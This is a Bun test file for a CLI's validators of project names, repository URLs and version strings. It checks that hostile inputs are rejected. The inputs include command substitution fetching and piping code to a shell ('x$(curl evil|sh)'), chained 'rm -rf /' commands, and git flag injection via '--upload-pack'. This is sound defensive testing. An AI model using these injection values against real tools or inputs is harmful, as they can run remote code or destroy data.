import { describe, it, expect } from "bun:test";
import {
  isValidRepoUrl,
  isValidVersion,
  validateProjectName,
} from "../validation";

describe("validateProjectName", () => {
  it("should accept safe slugs", () => {
    expect(validateProjectName("my-app")).toBeUndefined();
    expect(validateProjectName("my_app2")).toBeUndefined();
    expect(validateProjectName("App123")).toBeUndefined();
  });

  it("should reject an empty name", () => {
    expect(validateProjectName("")).toContain("Please enter");
    expect(validateProjectName("", true)).toContain("module");
  });

  it("should reject dots with the advertised MikroORM message", () => {
    expect(validateProjectName("my.app")).toContain("dot");
  });

  it("should reject shell metacharacters and command substitution", () => {
    for (const name of [
      "x$(curl evil|sh)",
      "a;rm -rf /",
      "a b",
      "a&b",
      "a`b`",
      "a'b",
      'a"b',
      "a\\b",
      "a/b",
    ]) {
      expect(validateProjectName(name)).toContain("may only contain");
    }
  });

  it("should reject names starting with a hyphen (git/bunx flag injection)", () => {
    expect(validateProjectName("-my-app")).toContain("may only contain");
    expect(validateProjectName("--upload-pack=x")).toContain("may only contain");
  });

  it("should use module wording when isModule is true", () => {
    expect(validateProjectName("bad name", true)).toContain("module");
  });
});

describe("isValidRepoUrl", () => {
  it("should accept http(s), git, and ssh URLs", () => {
    expect(isValidRepoUrl("https://github.com/damatjs/damat-starter-default")).toBe(true);
    expect(isValidRepoUrl("http://example.com/repo.git")).toBe(true);
    expect(isValidRepoUrl("git://example.com/repo.git")).toBe(true);
    expect(isValidRepoUrl("ssh://git@example.com:2222/repo.git")).toBe(true);
  });

  it("should accept scp-like git@host:path addresses", () => {
    expect(isValidRepoUrl("git@github.com:damatjs/damat.git")).toBe(true);
  });

  it("should accept owner/repo shorthand", () => {
    expect(isValidRepoUrl("damatjs/damat-starter-default")).toBe(true);
  });

  it("should reject values with shell metacharacters or spaces", () => {
    expect(isValidRepoUrl("https://x.com/$(evil)")).toBe(false);
    expect(isValidRepoUrl("repo; rm -rf /")).toBe(false);
    expect(isValidRepoUrl("https://x.com/a b")).toBe(false);
  });

  it("should reject values that could be parsed as git flags", () => {
    expect(isValidRepoUrl("--upload-pack=touch /tmp/pwn")).toBe(false);
    expect(isValidRepoUrl("-o evil")).toBe(false);
  });
});

describe("isValidVersion", () => {
  it("should accept semver versions, tags, and simple ranges", () => {
    for (const v of [
      "latest",
      "next",
      "1.2.3",
      "v1.2.3",
      "1.2.3-beta.1",
      "^1.0.0",
      "~2.0.0",
    ]) {
      expect(isValidVersion(v)).toBe(true);
    }
  });

  it("should reject injection attempts and malformed values", () => {
    for (const v of ["", "1.2.3; rm -rf /", "$(evil)", "1.2.3 --flag", "-1.0.0"]) {
      expect(isValidVersion(v)).toBe(false);
    }
  });
});
